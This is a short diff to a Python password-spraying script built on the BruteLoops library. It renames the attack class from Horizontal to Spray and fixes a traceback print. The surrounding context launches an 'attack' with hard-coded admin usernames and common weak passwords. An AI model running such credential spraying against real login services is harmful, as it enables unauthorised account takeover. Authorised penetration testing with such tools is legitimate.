@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 from BruteLoops.jitter import Jitter
-from BruteLoops.brute import Horizontal
+from BruteLoops.brute import Spray
 from BruteLoops.config import Config
 from BruteLoops.logging import GENERAL_EVENTS,logging
 
@@ -97,7 +97,7 @@ logger = logging.getLogger('brute_logger')
 try:
 
     logger.log(GENERAL_EVENTS,'Initializing attack')
-    bf = Horizontal(config)
+    bf = Spray(config)
     bf.launch(
         usernames=['admin','administrator','super-admin'],
         passwords=['Password1','Password#1','Password1!','Password123',
@@ -110,7 +110,7 @@ except Exception as e:
     print()
     print('Unhandled exception occurred.\n')
     print(e)
-    print(e.with_traceback())
+    print(e.with_traceback(e.__traceback__))
     print(e.__traceback__.__dir__())
     print(e.__traceback__.tb_lineno)
     print()
